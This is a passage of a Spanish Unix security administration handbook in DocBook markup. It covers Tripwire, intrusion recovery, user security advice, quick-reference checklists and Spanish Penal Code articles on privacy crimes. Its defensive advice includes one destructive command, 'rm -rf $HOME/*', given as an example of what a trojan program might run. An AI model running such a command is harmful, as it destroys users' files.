&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32774&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.printer&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.listen&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.6000&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.32775&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;0&#x00A0;LISTEN
&#x00A0;anita:~#
</literallayout>
     </listitem>
     <listitem>
     <!--l. 650--><para>Tripwire
     <!--br/-->Quiz&#x00E1;s una de las formas m&#x00E1;s efectivas de detectar accesos no autorizados es mediante el programa
     Tripwire. La idea es sencilla: en un sistema &#x2018;limpio&#x2019; (por ejemplo, reci&#x00E9;n instalado, antes de ser
     conectado a red) se aplica una funci&#x00F3;n de resumen (message digest) sobre los &#xFB01;cheros importantes del
     equipo, (por ejemplo, &#xFB01;cheros en /etc/, /bin/ o /sbin/). Los resultados de este proceso se
     almacenan en un medio que a partir de ese momento ser&#x00E1; de s&#x00F3;lo lectura, como un disco
     &#xFB02;exible protegido contra escritura o un CD-ROM, y peri&#x00F3;dicamente volvemos a aplicar
     el resumen sobre los &#xFB01;cheros de nuestro equipo; si se detecta un cambio (por ejemplo,
     una variaci&#x00F3;n en el tama~no, un cambio de propietario, la desaparici&#x00F3;n de un archivo&#x2026;),
     Tripwire nos lo va a indicar. Si no lo hemos realizado nosotros, como administradores, es
     posible (muy posible) que ese &#xFB01;chero haya sido modi&#xFB01;cado en bene&#xFB01;cio propio por un
     intruso.</para></listitem></itemizedlist>
<!--l. 665--><para>
  </para></section><!--end section--><!--l. 665--><section 
role="section"><title><abbrev role="title-mark">A.3</abbrev><anchor 
   id="x1-345000A.3"  ></anchor>Recuperaci&#x00F3;n</title>
<!--l. 666--><para>  &#x00BF;Qu&#x00E9; hacer cuando se detecta una intrusi&#x00F3;n en la m&#x00E1;quina? Muchos administradores se hacen esta pregunta
cuando se dan cuenta de que su seguridad ha sido quebrada. Por supuesto, en esta situaci&#x00F3;n se pueden
hacer muchas cosas, desde ignorar el hecho y dejar que el pirata haga lo que quiera en nuestro sistema
(obviamente, esto no es recomendable) hasta intentar localizar al intruso mediante denuncia y orden
judicial para tracear la llamada; esto tampoco es habitual, ya que es muy dif&#x02CA;&#x0131;cil demostrar ante un juez
que un atacante ha violado nuestra seguridad, por lo que s&#x00F3;lo vamos a perder tiempo y dinero. Lo habitual
en entornos universitarios es intentar detectar si el atacante pertenece a la comunidad universitaria (en
cuyo caso se le puede sancionar), restaurar la integridad del equipo de forma que un ataque
similar no vuelva a tener &#x00E9;xito, y poner de nuevo la m&#x00E1;quina a trabajar (recordemos que la
disponibilidad suele ser lo m&#x00E1;s importante en organizaciones de I+D). Pero, hagamos lo que
hagamos, hay que cumplir una norma b&#x00E1;sica: no ponernos nerviosos; si no logramos mantener la
calma podemos ser incluso m&#x00E1;s perjudiciales para el sistema que el propio intruso o podemos
poner a &#x00E9;ste nervioso, lo que puede convertir un simple &#xFB01;sgoneo en una p&#x00E9;rdida irrecuperable de
datos.
<!--br/-->
<!--br/-->Desde el punto de vista de Unix, es posible que nos interese localizar el fallo de seguridad aprovechado por

el pirata para cerrarlo y que el problema no vuelva a ocurrir; sin entrar en temas complejos como el jailing
o la simulaci&#x00F3;n, una de las formas que tenemos para realizar esta tarea es monitorizar las actividades del
intruso, incluso arriesgando la integridad del sistema (podemos hacer una copia de seguridad
por lo que pueda pasar). Para realizar esto, hemos de ser conscientes de que si alguien ha
conseguido privilegios de administrador en la m&#x00E1;quina, puede haber modi&#xFB01;cado desde los programas
del sistema hasta las librer&#x02CA;&#x0131;as din&#x00E1;micas, pasando incluso por el subsistema de accounting de
procesos. Por tanto, hemos de descon&#xFB01;ar de los resultados que cualquier orden nos proporcione, ya
que el intruso puede haberlos modi&#xFB01;cado para ocultar sus actividades. Si queremos auditar
las actividades del atacante hemos de utilizar programas &#x2018;nuevos&#x2019;, a ser posible compilados
est&#x00E1;ticamente (sin dependencia de librer&#x02CA;&#x0131;as din&#x00E1;micas): podemos utilizar versiones de c&#x00F3;digo fuente
disponible para adecuarlas a nuestro sistema, compilarlas est&#x00E1;ticamente en un sistema similar al
atacado <anchor 
   id="x1-345001f5"  ></anchor><footnote><para>     El pirata tambi&#x00E9;n puede haber modi&#xFB01;cado el compilador.</para></footnote>,
y utilizarlas en la m&#x00E1;quina donde est&#x00E1; el intruso.
<!--br/-->
<!--br/-->El proceso de modi&#xFB01;car librer&#x02CA;&#x0131;as din&#x00E1;micas habitualmente excede los conocimientos del atacante medio de
entornos I+D; como adem&#x00E1;s conseguir programas est&#x00E1;ticos para nuestro equipo suele ser complejo y lento en
la mayor&#x02CA;&#x0131;a de situaciones, y un objetivo b&#x00E1;sico es devolver el sistema a su funcionamiento normal cuanto
antes, lo habitual no es utilizar programas compilados de forma est&#x00E1;tica sino con&#xFB01;ar en que el intruso no
haya modi&#xFB01;cado librer&#x02CA;&#x0131;as din&#x00E1;micas y utilizar versiones &#x2018;limpias&#x2019; de programas din&#x00E1;micos; por ejemplo,
podemos utilizar los programas originales del sistema operativo que se encuentran en el CD-ROM de
instalaci&#x00F3;n del mismo.
<!--br/-->
<!--br/-->Si en lugar de intentar monitorizar las actividades del intruso en el sistema lo &#x00FA;nico que queremos es echarlo
de nuestra m&#x00E1;quina (esto tiene su parte positiva, pero tambi&#x00E9;n su parte negativa), hemos de tener siempre
presente que desconocemos lo que ha hecho; la forma m&#x00E1;s efectiva de tirarlo de nuestro equipo es
desconectando el cable de red (mucho mejor que utilizar ifconfig para detener la tarjeta o shutdown
para parar el sistema, ya que el atacante puede haber contaminado estos programas para que realicen una
actividad diferente a la que en teor&#x02CA;&#x0131;a est&#x00E1;n destinados). Pero no nos podemos limitar &#x00FA;nicamente a
desconectar el cable de red: el atacante puede tener procesos activos en el sistema, bombas l&#x00F3;gicas, o
simplemente tareas destructivas plani&#xFB01;cadas con at o cron; hemos de chequear todo el sistema en busca
de este tipo de amenazas. Un lugar interesante donde el intruso nos puede causar un problema
grave es en los &#xFB01;cheros de inicializaci&#x00F3;n de la m&#x00E1;quina, situados generalmente en /etc/rc?.d/ o
/etc/rc.d/.
<!--br/-->
<!--br/-->Una vez detectado y solucionado el problema de seguridad hemos de restaurar un estado &#xFB01;able de la
m&#x00E1;quina, esto es, un estado similar al que ten&#x02CA;&#x0131;a antes de ser atacada. Aunque en muchos lugares se indica
restaurar una copia de seguridad anterior al ataque, esto presenta graves problemas: realmente no sabemos
con certeza cuando se produjo el ataque al sistema, sino que en todo caso sabemos cu&#x00E1;ndo se detect&#x00F3; el
mismo, por lo que corremos el peligro de utilizar una copia de seguridad que ya est&#x00E9; contaminada por el
atacante. Es mucho m&#x00E1;s seguro reinstalar el sistema completo y actualizarlo para solucionar los fallos que
posibilitaron la entrada del intruso, por ejemplo aplicando patches sobre la versi&#x00F3;n que hemos
instalado.
<!--br/-->
<!--br/-->Restaurar y actualizar el sistema operativo y sus programas puede ser una tarea pesada, pero no implica
ninguna complicaci&#x00F3;n: con toda probabilidad tenemos a nuestra disposici&#x00F3;n los CD-ROMs con el software
que hemos de instalar; los problemas reales surgen con los archivos de los usuarios: evidentemente, no
podemos decirles que para evitar posibles con&#xFB02;ictos de seguridad se les han borrado sus archivos, sino que
lo habitual va a ser mantener el estado de sus &#xFB01;cheros justo como estaban durante el ataque o, en caso de
que este haya eliminado o corrompido informaci&#x00F3;n, tal y como estaban exactamente antes del ataque. Por
tanto, especialmente si mantenemos el estado de los &#xFB01;cheros de usuario, hay que estar atentos a
posibles problemas que estos puedan introducir en el sistema, comentados en el apartado
<ulink 
  url="#x1-344000A.2"  ><!--ref: userdir--></ulink>.
<!--br/-->
  </para></section><!--end section--><!--l. 748--><section 
role="section"><title><abbrev role="title-mark">A.4</abbrev><anchor 
   id="x1-346000A.4"  ></anchor>Recomendaciones de seguridad para los usuarios</title>

<!--l. 749--><para>  Con frecuencia la parte m&#x00E1;s complicada de una pol&#x02CA;&#x0131;tica de seguridad es concienciar a los usuarios de la
necesidad de medidas b&#x00E1;sicas de prevenci&#x00F3;n contra ataques. Demasiados usuarios opinan que las historias de
crackers que atacan ordenadores s&#x00F3;lo suceden en las pel&#x02CA;&#x0131;culas o en organizaciones militares de alta
seguridad; nada m&#x00E1;s lejos de la realidad: en cualquier universidad ocurren a diario incidentes
de seguridad, de los que s&#x00F3;lo una peque~na parte se detecta (y muchos menos se solucionan).
Ser&#x02CA;&#x0131;a pues muy recomendable para el administrador imprimir una hoja con las medidas de
seguridad b&#x00E1;sicas o la pol&#x02CA;&#x0131;tica del sistema, y entregar una copia a cada usuario al crear su
cuenta.
     </para><itemizedlist>
     <listitem>
     <!--l. 760--><para>Contrase~nas aceptables
     <!--br/-->Es  conveniente  que  los  usuarios  elijan  claves  medianamente  resistentes  a  ataques  de
     diccionario; una contrase~na como patata o valencia es un gran agujero de seguridad para
     la m&#x00E1;quina, aunque el usuario que la usa no tenga ning&#x00FA;n privilegio especial. Hemos de ver la
     seguridad como una cadena cuya fuerza depende principalmente del eslab&#x00F3;n m&#x00E1;s d&#x00E9;bil: si falla
     &#x00E9;ste, falla toda la cadena. Sin embargo, el problema de estas claves es que pueden llegar a ser
     dif&#x02CA;&#x0131;ciles de recordar, de forma que mucha gente opta por apuntarlas en el monitor de su estaci&#x00F3;n
     o en la parte inferior de sus teclados; obviamente, esto es casi peor que el problema inicial, ya
     que como administradores no podemos controlar estas situaciones la mayor parte de las veces.
     Podemos (y ser&#x02CA;&#x0131;a lo recomendable) recomendar a los usuarios que utilicen combinaciones
     de may&#x00FA;sculas, min&#x00FA;sculas, n&#x00FA;meros y s&#x02CA;&#x0131;mbolos para generar sus claves, pero de forma que la
     combinaci&#x00F3;n les pueda resultar familiar: por ejemplo, combinar n&#x00FA;meros y letras de la matr&#x02CA;&#x0131;cula
     del coche con algunos s&#x02CA;&#x0131;mbolos de separaci&#x00F3;n; claves de este estilo podr&#x02CA;&#x0131;an ser V#GF&#x0026;121,
     @3289?DH o JKnB0322. Obviamente estas claves son m&#x00E1;s resistentes a un ataque que beatles,
     pero tampoco son seguras: las acabamos de escribir.
     </para></listitem>
     <listitem>
     <!--l. 779--><para>Con&#xFB01;dencialidad de las claves
     <!--br/-->Hemos de concienciar a nuestros usuarios de que las contrase~nas no se comparten: no
     es recomendable &#x2018;prestar&#x2019; su clave a otras personas, ajenas o no al sistema, ni por supuesto
     utilizar la misma clave para diferentes m&#x00E1;quinas. Este &#x00FA;ltimo punto muchas veces se olvida en
     sistemas de I+D, donde el usuario se ve obligado a utilizar passwords para muchas actividades
     y tiende invariablemente a usar la misma contrase~na; incluso se utiliza la clave de acceso a
     un equipo Unix para autenticarse en juegos de red (MUDs o IRC) o, lo que es igual de grave,
     para acceder a equipos Windows, de forma que las vulnerabilidades de seguridad de estos
     sistemas se trasladan a Unix.
     </para></listitem>
     <listitem>
     <!--l. 789--><para>Conexiones cifradas
     <!--br/-->Hay que potenciar entre los usuarios el uso de programas como ssh/scp o
     <!--br/-->ssl-telnet/ssl-ftp para conectar al equipo. La parte cliente de estos programas es muy
     simple de utilizar, y nos puede ahorrar muchos dolores de cabeza como administradores.
     Incluso existen clientes para Windows y MacOS, por lo que nadie tiene excusa para no usar
     sistemas cifrados (se puede conseguir que su uso sea completamente transparente al usuario);
     casi la mejor forma de que los usuarios los utilicen es dejando de ofrecer ciertos servicios sin
     cifra, como telnet, ftp, rlogin o rsh.
     </para></listitem>
     <listitem>
     <!--l. 798--><para>Ejecuci&#x00F3;n de programas
     <!--br/-->Nunca, bajo ning&#x00FA;n concepto, instalar o ejecutar software que no provenga de fuentes &#xFB01;ables;
     hay que prestar atenci&#x00F3;n especial a programas que nos env&#x02CA;&#x0131;en por correo o por IRC, ya que
     se puede tratar de programas trampa que, desde borrar todos nuestros &#xFB01;cheros, a enviar por
     correo una copia del archivo de contrase~nas, pueden hacer cualquier cosa: imaginemos que un

     &#x2018;amigo&#x2019; nos env&#x02CA;&#x0131;a un juego a trav&#x00E9;s de cualquier medio &#x2013; especialmente IRC &#x2013; y nosotros lo
     ejecutamos; incluso disponer del c&#x00F3;digo fuente no es ninguna garant&#x02CA;&#x0131;a (&#x00BF;qu&#x00E9; usuario medio lee
     un c&#x00F3;digo en C de, quiz&#x00E1;s, miles de l&#x02CA;&#x0131;neas?). Ese programa puede hacer algo tan simple como
     rm -rf $HOME/* sin que nosotros nos demos cuenta, con las consecuencias que esta orden
     implica.
     </para></listitem>
     <listitem>
     <!--l. 810--><para>Descon&#xFB01;anza
     <!--br/-->Hemos de descon&#xFB01;ar de cualquier correo electr&#x00F3;nico, llamada telef&#x00F3;nica o mensaje de otro tipo
     que nos indique realizar una determinada actividad en el sistema, especialmente cambiar la
     clave o ejecutar cierta orden; con frecuencia, un usuario se convierte en c&#x00F3;mplice involuntario de
     un atacante: imaginemos que recibimos una llamada de alguien que dice ser el administrador
     del sistema y que nos recomienda cambiar nuestra clave por otra que &#x00E9;l nos facilita, con la
     excusa de comprobar el funcionamiento del nuevo software de correo. Si hacemos esto, esa
     persona ya tiene nuestra contrase~na para acceder ilegalmente a la m&#x00E1;quina y hacer all&#x02CA;&#x0131; lo
     que quiera; hemos de recordar siempre que el administrador no necesita nuestra ayuda para
     comprobar nada, y si necesita cambiar nuestra clave, lo puede hacer &#x00E9;l mismo.
     </para></listitem>
     <listitem>
     <!--l. 822--><para>Un &#x00FA;ltimo consejo&#x2026;
     <!--br/-->Cualquier  actividad  sospechosa  que  detectemos,  aunque  no  nos  implique  directamente  a
     nosotros, ha de ser noti&#xFB01;cada al administrador o responsable de seguridad del equipo. Esta
     noti&#xFB01;caci&#x00F3;n, a ser posible, no se ha de realizar por correo electr&#x00F3;nico (un atacante puede eliminar
     ese mail), sino en persona o por tel&#x00E9;fono.
     <!--br/-->En muchas ocasiones, cuando un usuario nota un comportamiento extra~no en el sistema, no
     noti&#xFB01;ca nada pensando que el administrador ya se ha enterado del suceso, o por miedo a quedar
     en rid&#x02CA;&#x0131;culo (quiz&#x00E1;s que lo que nosotros consideramos &#x2018;extra~no&#x2019; resulta ser algo completamente
     normal); esta situaci&#x00F3;n es err&#x00F3;nea: si se trata de una falsa alarma, mucho mejor, pero&#x2026;&#x00BF;y si no
     lo es?</para></listitem></itemizedlist>
<!--l. 835--><para>
  </para></section><!--end section--><!--l. 835--><section 
role="section"><title><abbrev role="title-mark">A.5</abbrev><anchor 
   id="x1-347000A.5"  ></anchor>Referencias r&#x00E1;pidas</title>
<!--l. 836--><para>
  </para><!--l. 836--><section 
role="subsection"><title><abbrev role="title-mark">A.5.1</abbrev><anchor 
   id="x1-348000A.5.1"  ></anchor>Prevenci&#x00F3;n</title>
<!--l. 837--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 838--><para>Cerrar los servicios de inetd que no sean estrictamente necesarios.
     </para></listitem>
     <listitem>
     <!--l. 839--><para>No lanzar demonios en el arranque de m&#x00E1;quina que no sean estrictamente necesarios.
     </para></listitem>
     <listitem>
     <!--l. 841--><para>Minimizar el n&#x00FA;mero de &#xFB01;cheros setuidados o setgidados en la m&#x00E1;quina.
     </para></listitem>
     <listitem>
     <!--l. 842--><para>Instalar TCP Wrappers y utilizar una pol&#x02CA;&#x0131;tica restrictiva: echo ALL:ALL &#x003E;/etc/hosts.deny.

     </para></listitem>
     <listitem>
     <!--l. 844--><para>Utilizar TCP Wrappers para controlar el acceso a nuestro sendmail, o utilizar un wrapper
     propio para este demonio.
     </para></listitem>
     <listitem>
     <!--l. 846--><para>Sustituir telnet, ftp o similares por ssh y scp.
     </para></listitem>
     <listitem>
     <!--l. 847--><para>No permitir &#xFB01;cheros $HOME/.rhosts en los directorios de usuarios, y no establecer relaciones
     de con&#xFB01;anza en /etc/hosts.equiv.
     </para></listitem>
     <listitem>
     <!--l. 849--><para>Deshabilitar las cuentas del sistema que no corresponden a usuarios reales (uucp, lp&#x2026;).
     </para></listitem>
     <listitem>
     <!--l. 851--><para>Instalar un sistema Shadow Password para que los usuarios no puedan leer las claves cifradas.
     </para></listitem>
     <listitem>
     <!--l. 853--><para>Deshabilitar las cuentas de usuarios que no conecten al sistema.
     </para></listitem>
     <listitem>
     <!--l. 854--><para>Utilizar versiones actualizadas del n&#x00FA;cleo del sistema operativo.
     </para></listitem>
     <listitem>
     <!--l. 855--><para>Evitar sobrecargas de servicio plani&#xFB01;cando pkill -HUP inetd en nuestro &#xFB01;chero crontab.</para></listitem></itemizedlist>
<!--l. 858--><para>
  </para></section><!--end subsection--><!--l. 858--><section 
role="subsection"><title><abbrev role="title-mark">A.5.2</abbrev><anchor 
   id="x1-349000A.5.2"  ></anchor>Detecci&#x00F3;n</title>
<!--l. 859--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 860--><para>Con&#xFB01;gurar Tripwire nada m&#x00E1;s instalar el sistema y guardar sus resultados en un medio &#xFB01;able;
     cada cierto tiempo, ejecutar Tripwire para comparar sus resultados con los iniciales.
     </para></listitem>
     <listitem>
     <!--l. 863--><para>Chequear peri&#x00F3;dicamente los logs en busca de actividades sospechosas.
     </para></listitem>
     <listitem>
     <!--l. 865--><para>Utilizar &#x00F3;rdenes como ps, netstat o last para detectar cualquier evento fuera de lo normal
     en el sistema, pero no con&#xFB01;ar ciegamente en los resultados que se nos muestran en pantalla:
     seamos paranoicos.
     </para></listitem>
     <listitem>
     <!--l. 868--><para>Comprobar peri&#x00F3;dicamente la integridad de &#xFB01;cheros importantes de nuestro sistema, como
     /etc/passwd, /etc/exports, /etc/syslog.conf, /etc/aliases o &#xFB01;cheros de arranque.

     </para></listitem>
     <listitem>
     <!--l. 871--><para>Comprobar  tambi&#x00E9;n  elementos  como  los  permisos  o  el  propietario  de  los  &#xFB01;cheros  que  se
     encuentran en los directorios de usuarios.</para></listitem></itemizedlist>
<!--l. 874--><para>
  </para></section><!--end subsection--><!--l. 874--><section 
role="subsection"><title><abbrev role="title-mark">A.5.3</abbrev><anchor 
   id="x1-350000A.5.3"  ></anchor>Recuperaci&#x00F3;n</title>
<!--l. 875--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 876--><para>Nunca hay que ponerse nervioso: nuestra m&#x00E1;quina ni ha sido la primera ni lamentablemente
     ser&#x00E1; la &#x00FA;ltima en sufrir un ataque. No es el &#xFB01;n del mundo.
     </para></listitem>
     <listitem>
     <!--l. 879--><para>Descon&#xFB01;ar  de  cualquier  programa  que  se  encuentre  en  el  sistema;  utilizar  programas  del
     CD-ROM del sistema operativo, o versiones est&#x00E1;ticas de los mismos, para tracear las actividades
     del intruso.
     </para></listitem>
     <listitem>
     <!--l. 882--><para>Si es posible, reinstalar el sistema operativo completo y aplicarle los parches de seguridad que el
     fabricante pone a nuestra disposici&#x00F3;n <anchor 
   id="x1-350001f6"  ></anchor><footnote><para>     O que se distribuyen por Internet.</para></footnote>;
     permanecer atentos a los directorios de usuarios y a los programas que &#x00E9;stos contienen.
     </para></listitem>
     <listitem>
     <!--l. 886--><para>Si pensamos que la integridad del sistema peligra mucho, desconectar directamente el cable
     de red: utilizar ifconfig down o detener el sistema con shutdown puede incluso acarrearnos
     problemas.
     </para></listitem>
     <listitem>
     <!--l. 889--><para>Obviamente, antes de poner el sistema de nuevo a funcionar en red, estar completamente
     seguro que los problemas de seguridad que el atacante aprovech&#x00F3; est&#x00E1;n solucionados.</para></listitem></itemizedlist>
<!--l. 893--><para>
  </para></section><!--end subsection--><!--l. 893--><section 
role="subsection"><title><abbrev role="title-mark">A.5.4</abbrev><anchor 
   id="x1-351000A.5.4"  ></anchor>Usuarios</title>
<!--l. 894--><para>
     </para><itemizedlist>
     <listitem>
     <!--l. 895--><para>No elegir claves de menos de seis caracteres, y combinar may&#x00FA;sculas, min&#x00FA;sculas, n&#x00FA;meros, signos
     de puntuaci&#x00F3;n&#x2026;cualquier cosa que nos permita el teclado.
     </para></listitem>
     <listitem>
     <!--l. 898--><para>No apuntar nuestras claves ni compartirlas con otras personas.
     </para></listitem>
     <listitem>
     <!--l. 899--><para>No utilizar nuestra contrase~na de acceso en otros sistemas, especialmente juegos en red o
     equipos Windows.

     </para></listitem>
     <listitem>
     <!--l. 901--><para>Sustituir telnet y ftp por ssh y scp o similares.
     </para></listitem>
     <listitem>
     <!--l. 902--><para>Nunca ejecutar programas que nos envien por correo o que consigamos a partir de fuentes
     poco &#xFB01;ables (como un &#x2018;amigo&#x2019; que nos pasa un programa por IRC). Tampoco ejecutar &#x00F3;rdenes
     cuyo funcionamiento desconocemos, especialmente si alguien desconocido nos indica teclear
     &#x2018;algo&#x2019; para ver el resultado.
     </para></listitem>
     <listitem>
     <!--l. 907--><para>Descon&#xFB01;ar  de  llamadas  telef&#x00F3;nicas  o  correo  electr&#x00F3;nico  que  nos  incita  a  realizar  cualquier
     actividad dentro del sistema, especialmente cambiar nuestra clave; si estas situaciones se
     producen, indicarlo inmediatamente al responsable de seguridad del equipo, mediante tel&#x00E9;fono
     o en persona.
     </para></listitem>
     <listitem>
     <!--l. 911--><para>Ante cualquier actividad sospechosa que se detecte es recomendable ponerse en contacto con
     el responsable de seguridad o el administrador, a ser posible por tel&#x00E9;fono o en persona.</para></listitem></itemizedlist>

<!--l. 134--><para>


</para><!--l. 1--><para>

<anchor 
   id="x1-351001r363"  ></anchor>
  </para></section><!--end subsection--></section><!--end section--><anchor 
   id="x1-352000B"  ></anchor>Normativa
  <!--l. 2--><section 
role="section"><title><abbrev role="title-mark">B.1</abbrev><anchor 
   id="x1-353000B.1"  ></anchor>Nuevo C&#x00F3;digo Penal</title>
<!--l. 3--><para>  <anchor 
   id="x1-353001f0"  ></anchor><footnote><para>   Delitos relacionados con nuevas tecnolog&#x02CA;&#x0131;as.</para></footnote>
</para><section role="center"><title/>
<!--l. 4--><para> T&#x00CD;TULO X</para></section>
<!--l. 7--><para>Delitos contra la intimidad, el derecho a la propia imagen y la inviolabilidad del
domicilio
</para><section role="center"><title/>
<!--l. 9--><para> CAP&#x00CD;TULO I
</para><!--l. 11--><para>Del descubrimiento y revelaci&#x00F3;n de secretos</para></section>
<!--l. 13--><para>Art&#x02CA;&#x0131;culo 197
</para><!--l. 15--><para>  1. El que para descubrir los secretos o vulnerar la intimidad de otro, sin su consentimiento, se apodere
de sus papeles, cartas, mensajes de correo electr&#x00F3;nico o cualesquiera otros documentos o efectos
personales o intercepte sus telecomunicaciones o utilice arti&#xFB01;cios t&#x00E9;cnicos de escucha, transmisi&#x00F3;n,
grabaci&#x00F3;n o reproducci&#x00F3;n del sonido o de la imagen, o de cualquier otra se~nal de comunicaci&#x00F3;n,
ser&#x00E1; castigado con las penas de prision de uno a cuatro a~nos y multa de doce a veinticuatro
meses.
</para><!--l. 23--><para>  2. Las mismas penas se impondr&#x00E1;n al que, sin estar autorizado, se apodere, utilice o modi&#xFB01;que, en
perjuicio de tercero, datos reservados de car&#x00E1;cter personal o familiar de otro que se hallen registrados en
&#xFB01;cheros o soportes inform&#x00E1;ticos, electr&#x00F3;nicos o telem&#x00E1;ticos, o en cualquier otro tipo de archivo o registro
p&#x00FA;blico o privado. Iguales penas se impondr&#x00E1;n a quien, sin estar autorizado, acceda por cualquier
medio a los mismos y a quien los altere o utilice en perjuicio del titular de los datos o de un
tercero.
</para><!--l. 31--><para>  3. Se impondr&#x00E1; la pena de prisi&#x00F3;n de dos a cinco a~nos si se difunden, revelan o ceden a terceros los datos o
hechos descubiertos o las im&#x00E1;genes captadas a que se re&#xFB01;eren los n&#x00FA;meros anteriores. Ser&#x00E1; castigado con las
penas de prisi&#x00F3;n de uno a tres a~nos y multa de doce a veinticuatro meses, el que, con conocimiento de su
origen il&#x02CA;&#x0131;cito y sin haber tomado parte en su descubrimiento, realizare la conducta descrita en el p&#x00E1;rrafo
anterior.
</para><!--l. 39--><para>  4. Si los hechos descritos en los apartados 1 y 2 de este art&#x02CA;&#x0131;culo se realizan por las personas encargadas o
responsables de los &#xFB01;cheros, soportes inform&#x00E1;ticos, electr&#x00F3;nicos o telem&#x00E1;ticos, archivos o registros, se impondr&#x00E1;
la pena de prisi&#x00F3;n de tres a cinco a~nos, y si se difunden, ceden o revelan los datos reservados, se impondr&#x00E1; la
pena en su mitad superior.
</para><!--l. 46--><para>  5. Igualmente, cuando los hechos descritos en los apartados anteriores afecten a datos de car&#x00E1;cter
personal que revelen la ideolog&#x02CA;&#x0131;a, religi&#x00F3;n, creencias, salud, origen racial o vida sexual, o la
v&#x02CA;&#x0131;ctima fuere un menor de edad o un incapaz, se impondr&#x00E1;n las penas previstas en su mitad
superior.
</para><!--l. 52--><para>  6. Si los hechos se realizan con &#xFB01;nes lucrativos, se impondr&#x00E1;n las penas respectivamente previstas
en los apartados 1 al 4 de este art&#x02CA;&#x0131;culo en su mitad superior. Si adem&#x00E1;s afectan a datos de
los mencionados en el apartado 5, la pena a imponer ser&#x00E1; la de prisi&#x00F3;n de cuatro a siete a~nos.
<!--br/-->Art&#x02CA;&#x0131;culo 198
</para><!--l. 59--><para>  La autoridad o funcionario p&#x00FA;blico que, fuera de los casos permitidos por la Ley, sin mediar causa legal
por delito, y prevali&#x00E9;ndose de su cargo, realizare cualquiera de las conductas descritas en el
art&#x02CA;&#x0131;culo anterior, ser&#x00E1; castigado con las penas respectivamente previstas en el mismo, en su
mitad superior y, adem&#x00E1;s, con la de inhabilitaci&#x00F3;n absoluta por tiempo de seis a doce a~nos.
<!--br/-->Art&#x02CA;&#x0131;culo 199

</para><!--l. 68--><para>  1. El que revelare secretos ajenos, de los que tenga conocimiento por raz&#x00F3;n de su o&#xFB01;cio o sus
relaciones laborales, ser&#x00E1; castigado con la pena de prisi&#x00F3;n de uno a tres a~nos y multa de seis a doce
meses.
</para><!--l. 72--><para>  2. El profesional que, con incumplimiento de su obligaci&#x00F3;n de sigilo o reserva, divulgue los secretos
de otra persona, ser&#x00E1; castigado con la pena de prisi&#x00F3;n de uno a cuatro a~nos, multa de doce a
veinticuatro meses e inhabilitaci&#x00F3;n especial para dicha profesi&#x00F3;n por tiempo de dos a seis a~nos.
<!--br/-->Art&#x02CA;&#x0131;culo 200
